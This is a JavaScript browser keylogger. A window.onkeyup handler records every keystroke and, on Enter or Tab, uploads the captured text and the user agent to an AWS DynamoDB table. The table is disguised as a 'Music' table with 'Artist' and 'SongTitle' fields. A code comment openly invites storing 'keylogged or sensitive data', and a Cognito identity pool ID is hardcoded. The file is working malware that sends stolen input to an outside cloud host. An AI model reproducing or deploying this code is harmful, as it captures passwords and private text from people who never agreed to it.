var AWS = require('aws-sdk');

/*
    keycodes for future reference
    ENTER = 13
    ALT = 18
    TAB = 9
    SHIFT = 16
*/

// initialize Amazon Cognito credentials provider
AWS.config.region = 'us-east-1';
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
    IdentityPoolId: 'us-east-1:7e93b0a2-2478-49f3-87e1-a695a3aed058',
});

// initialize DynamoDB document client for access to database
docClient = new AWS.DynamoDB.DocumentClient({region: 'us-east-2'});

// parameters for the table we want to log data into, and a blank item
var params = {
    TableName: 'Music',
    Item: {}
};

var strings = [];
let enter = 13;
let tab = 9;

// every time there is a keyup, collect it into the buffer. line 6, i'm not really sure what's going on there... got it from StackOverflow. so if we use something like this we'll want to figure out exactly how it works haha
window.onkeyup = function(e) {

    var key = e.keyCode ? e.keyCode : e.which;
    strings += String.fromCharCode(key);

    if( (e.keyCode == enter) || (e.keyCode == tab) )
    {
        // this is the primary key
        params.Item["Artist"] = Date.now().toString();
        // this is the secondary key
        params.Item["SongTitle"] = navigator.userAgent;
        // next, we can place any keylogged or sensitive data into the database (no limit on number of parameters, really)
        params.Item["KeyloggedText"] = strings;
        // actually put them in the database
        docClient.put(params, function(err, data) {
            if (err) {
                console.log("Error", err);
            } else {
                console.log("Success", data);
            }
        });
        writefunc();
    }


}

// this is a function that writes the buffer to the browser console, and then clears the buffer
function writefunc() {
    // reset the strings variable and the item for the DB
    console.log(strings);
    strings = [];
    params.Item = {};
}
